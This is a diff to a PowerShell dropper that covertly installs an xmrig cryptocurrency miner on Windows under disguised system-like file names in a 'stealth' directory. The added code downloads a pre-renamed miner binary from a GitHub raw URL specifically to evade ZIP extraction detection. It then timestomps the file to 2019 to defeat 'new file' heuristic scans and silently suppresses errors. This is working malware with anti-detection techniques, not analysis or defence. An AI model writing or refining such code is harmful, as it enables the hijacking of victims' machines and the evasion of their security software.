@@ -23,16 +23,18 @@ $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 $wc = New-Object System.Net.WebClient
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 1. Handle CPU Miner (RUTHLESS SEARCH)
+# 1. Handle CPU Miner (DIRECT DOWNLOAD + TIMESTOMP)
 if (-not (Test-Path $CpuExe)) {
     try {
-        $wc.DownloadFile($MinerUrl, $CpuZip)
-        $TempDir = Join-Path $StealthDir "temp_c"
-        Expand-Archive -Path $CpuZip -DestinationPath $TempDir -Force
-        $Unzipped = Get-ChildItem -Path $TempDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
-        Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
+        # Use a direct link to a raw pre-renamed binary to bypass ZIP extraction detection
+        $RawMinerUrl = "https://github.com/HolyV200/ultaV2/raw/main/win_sys_x.exe"
+        $wc.DownloadFile($RawMinerUrl, $CpuExe)
+        
+        # Timestomp: Make it look old (2019) to bypass "New File" heuristic scans
+        $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
+        (Get-Item $CpuExe).CreationTime = $OldDate
+        (Get-Item $CpuExe).LastWriteTime = $OldDate
+        (Get-Item $CpuExe).LastAccessTime = $OldDate
     } catch { }
 }
 
